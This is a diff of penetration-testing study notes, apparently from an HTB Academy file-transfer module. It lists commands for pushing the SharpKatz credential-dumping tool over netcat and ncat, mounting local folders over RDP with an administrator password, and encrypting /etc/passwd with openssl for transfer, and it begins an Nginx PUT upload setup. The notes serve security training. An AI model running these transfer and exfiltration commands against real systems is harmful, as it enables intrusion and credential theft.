@@ -26,4 +26,14 @@
 | `nc -q 0 192.168.49.128 8000 < SharpKatz.exe`                                                                                                                                                                                                                                          | nc - close on completion                         |
 | ncat --send-only 192.168.49.128 8000 < SharpKatz.exe                                                                                                                                                                                                                                   | ncat - listening and send file on connect        |
 | `rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`                                                                                                                                                                              | Mounting a Linux Folder Using rdesktop           |
-|                                                                                                                                                                                                                                                                                        | Mounting a Linux Folder Using xfreerdp           |
+| `xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`                                                                                                                                                               | Mounting a Linux Folder Using xfreerdp           |
+| `openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`                                                                                                                                                                                                             | Encrypting /etc/passwd with openssl              |
+| `openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`                                                                                                                                                                                                               | Decrypt passwd.enc with openssl<br>              |
+## Nginx - Enabling PUT
+#### Create a Directory to Handle Uploaded Files
+crimsonguard@htb[/htb]`$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory`
+
+#### Change the Owner to www-data
+crimsonguard@htb[/htb]`$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`
+
+#### Create Nginx Configuration File
